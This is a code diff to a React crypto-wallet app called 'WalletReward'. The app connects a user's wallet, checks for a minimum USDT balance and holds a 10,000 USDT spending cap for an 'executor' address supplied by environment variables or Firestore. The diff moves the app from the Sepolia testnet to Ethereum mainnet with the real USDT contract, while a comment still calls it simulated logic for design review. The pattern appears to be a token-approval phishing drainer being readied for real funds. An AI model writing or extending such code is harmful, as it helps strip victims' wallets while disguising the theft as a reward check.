@@ -13,7 +13,7 @@ import {
 import { BrowserProvider, Contract, formatUnits } from 'ethers';
 import { createAppKit } from '@reown/appkit/react';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
-import { sepolia } from '@reown/appkit/networks';
+import { mainnet } from '@reown/appkit/networks';
 import { addDoc, collection, doc, getDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from './firebase';
 
@@ -26,15 +26,15 @@ import { db } from './firebase';
  * - Step-by-step state management
  * - simulated verification logic for design review
  */
-const DEFAULT_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
-const DEFAULT_TOKEN = '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
-const MIN_REQUIRED_BALANCE = 100;
+const DEFAULT_EXECUTOR = import.meta.env.VITE_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000';
+const DEFAULT_TOKEN = import.meta.env.VITE_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const DEFAULT_MIN_REQUIRED_BALANCE = 100;
 const DEFAULT_SPENDING_CAP_UNITS = 10000;
 const REOWN_PROJECT_ID = '2541b17d4e46b8d8593a7fbbaf477df6';
 
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
-  networks: [sepolia],
+  networks: [mainnet],
   projectId: REOWN_PROJECT_ID,
   metadata: {
     name: 'WalletReward',
@@ -71,6 +71,7 @@ const App = () => {
   const [tokenSymbol, setTokenSymbol] = useState('USDT');
   const [tokenDecimals, setTokenDecimals] = useState(6);
   const [spendingCap, setSpendingCap] = useState(10000n * 10n ** 6n);
+  const [minRequiredBalance, setMinRequiredBalance] = useState(DEFAULT_MIN_REQUIRED_BALANCE);
 
   // UI state
   const [isConnecting, setIsConnecting] = useState(false);
@@ -81,7 +82,7 @@ const App = () => {
   const [connectError, setConnectError] = useState('');
   const [signError, setSignError] = useState('');
 
-  const minBalanceLabel = useMemo(() => `$${MIN_REQUIRED_BALANCE.toFixed(2)}`, []);
+  const minBalanceLabel = useMemo(() => `$${minRequiredBalance.toFixed(2)}`, [minRequiredBalance]);
 
   useEffect(() => {
     const loadSettings = async () => {
@@ -91,6 +92,8 @@ const App = () => {
         const data = snap.exists() ? snap.data() : {};
         setTokenAddress(data.tokenAddress || DEFAULT_TOKEN);
         setExecutorAddress(data.executorAddress || DEFAULT_EXECUTOR);
+        const parsedMin = Number(data.minRequiredBalance);
+        setMinRequiredBalance(Number.isFinite(parsedMin) ? parsedMin : DEFAULT_MIN_REQUIRED_BALANCE);
       } catch (err) {
         // fall back to defaults
       }
@@ -207,7 +210,7 @@ const App = () => {
       const balance = await token.balanceOf(connectedAddress);
       const normalized = Number(formatUnits(balance, tokenDecimals));
 
-      if (Number.isNaN(normalized) || normalized < MIN_REQUIRED_BALANCE) {
+      if (Number.isNaN(normalized) || normalized < minRequiredBalance) {
         setVerificationError(true);
         setVerificationErrorMessage(
           `Your wallet has ${normalized.toFixed(2)} ${tokenSymbol}. You need at least ${minBalanceLabel}.`
